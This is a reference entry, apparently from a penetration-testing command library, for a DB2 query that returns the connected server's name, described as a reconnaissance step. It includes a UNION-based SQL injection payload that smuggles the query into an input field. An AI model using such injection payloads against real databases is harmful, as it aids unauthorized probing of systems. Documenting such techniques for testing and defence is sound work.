---
id: 15906eec-a6d0-4895-b030-fc5d415d7168
name: db2-select-current-server
type: command
executor: sql
data: select current server from sysibm.sysdummy1
output: null
created_at: '2023-04-06T03:56:32.721647+00:00'
updated_at: '2023-04-10T20:21:59.042812+00:00'
platforms:
  - Database
  - DB2
tags:
  - db2
  - discovery
verified: true
validated: true
---

# db2-select-current-server

## Command

```sql
select current server from sysibm.sysdummy1
```

## Description

This SQL command queries the DB2 system dummy table to retrieve the name of the currently connected server. It is useful in reconnaissance to confirm the database server context, especially in multi-instance environments or during SQL injection exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| current server | Built-in DB2 function returning the server name | Yes |
| sysibm.sysdummy1 | System dummy table for dummy row selection | Yes |

## Examples

### Basic Usage

```sql
select current server from sysibm.sysdummy1
```

### In Injection Context

```sql
' UNION SELECT current server FROM sysibm.sysdummy1--
```

## Expected Output

A single row with the server name, for example:

CURRENT SERVER
-------------
DBSERVER01

Success is indicated by the return of a valid server identifier without errors.
